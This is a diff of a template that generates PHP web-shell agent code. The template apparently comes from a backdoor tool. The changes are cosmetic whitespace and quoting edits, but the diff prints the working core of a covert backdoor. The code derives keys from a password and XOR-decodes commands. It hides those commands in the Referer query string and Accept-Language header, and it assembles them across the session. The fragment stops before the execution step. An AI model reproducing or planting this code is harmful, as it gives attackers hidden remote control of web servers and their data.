@@ -2,17 +2,17 @@
 key = hashlib.md5(password).hexdigest().lower()
 header = key[:4]
 footer = key[4:8]
-%>$kh="${header}"; 
+%>$kh="${header}";
 $kf="${footer}";
 <%text>
-function x($t,$k) {
+function x($t,$k){
 	$c=strlen($k);
 	$l=strlen($t);
 	$o="";
-	for($i=0;$i<$l;) {
+	for($i=0;$i<$l;){
 		for($j=0;($j<$c&&$i<$l);$j++,$i++)
 		{
-			$o.= $t{$i}^$k{$j};
+			$o.=$t{$i}^$k{$j};
 		}
 	}
 	return $o;
@@ -24,30 +24,30 @@ $ra=@$r["HTTP_ACCEPT"];
 
 if($rr&&$ra){
 
-parse_str(@parse_url($rr)["query"],$q);
+	parse_str(@parse_url($rr)["query"],$q);
 	$q=array_values($q);
-	preg_match_all('/([\w])[\w-]+(?:;q=0.([\d]))?,?/',$ra,$m);
+	preg_match_all("/([\w])[\w-]+(?:;q=0.([\d]))?,?/",$ra,$m);
 
-	if($q&&$m) {
+	if($q&&$m){
 		@session_start();
 
 		$s=&$_SESSION;
-		$ss='substr';
-		$sl='strtolower';
+		$ss="substr";
+		$sl="strtolower";
 		
 		$i=$m[1][0].$m[1][1];
 		$h=$sl($ss(md5($i.$kh),0,3));
 		$f=$sl($ss(md5($i.$kf),0,3));
 
-		$p='';
+		$p="";
 		for($z=1;$z<count($m[1]);$z++) $p.=$q[$m[2][$z]];
 
 		if(strpos($p,$h)===0){
-			$s[$i] = '';
+			$s[$i]="";
 			$p=$ss($p,3);
 		}
 
-		if(array_key_exists($i,$s)) {
+		if(array_key_exists($i,$s)){
 
 			$s[$i].=$p;
 
